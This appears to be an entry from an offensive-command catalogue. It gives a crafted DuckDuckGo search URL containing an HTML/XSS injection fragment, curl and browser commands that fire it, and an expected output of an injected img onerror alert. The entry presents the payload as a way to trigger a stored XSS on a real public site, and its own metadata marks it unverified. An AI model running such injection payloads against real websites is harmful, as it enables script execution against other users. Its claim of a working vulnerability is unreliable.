---
id: cmd-uuid-9012
data: >-
  Navigate to
  https://duckduckgo.com/?q=urban+dictionary+%22%3E%3Cimg+src%3Dx%3C&t=ffab&atb=v1-1&ia=web
  or use curl to fetch
tags:
  - xss
  - web
type: command
output: Search results page with executed XSS payload
executor: browser
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:03.806Z'
verified: false
validated: true
submitted: true
---
# access-duckduckgo-vulnerable-search-url

## Command

```bash
# Primary: Browser navigation
# https://duckduckgo.com/?q=urban+dictionary+%22%3E%3Cimg+src%3Dx%3C&t=ffab&atb=v1-1&ia=web

# Alternative: curl fetch for inspection
curl "https://duckduckgo.com/?q=urban+dictionary+%22%3E%3Cimg+src%3Dx%3C&t=ffab&atb=v1-1&ia=web" -o results.html
```

## Description

This command accesses a DuckDuckGo search URL with a crafted query that triggers a stored XSS vulnerability by rendering unsanitized content from Urban Dictionary. Use in a browser to execute the payload or curl to fetch and inspect the HTML.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| q | Encoded search query including payload trigger (e.g., urban dictionary "><img src=x<) | Yes |
| t | Tracking parameter (e.g., ffab) | No |
| atb | A/B testing parameter (e.g., v1-1) | No |
| ia | Search type (e.g., web) | No |

## Examples

### Basic Usage

```bash
curl "https://duckduckgo.com/?q=urban+dictionary+%22%3E%3Cimg+src%3Dx%3C" -o xss_results.html
```

### Advanced Usage

```bash
curl "https://duckduckgo.com/?q=urban+dictionary+%22%3E%3Cimg+src%3Dx%3C&t=ffab&atb=v1-1&ia=web" --user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36" -o full_results.html
```

## Expected Output

HTML response containing search results with injected <img src=x onerror="alert('XSS')"> or similar payload. In browser, JS executes immediately, showing alerts or console logs.

## Related

- [[procedures/Trigger-DuckDuckGo-Stored-XSS-via-Search-Query]]
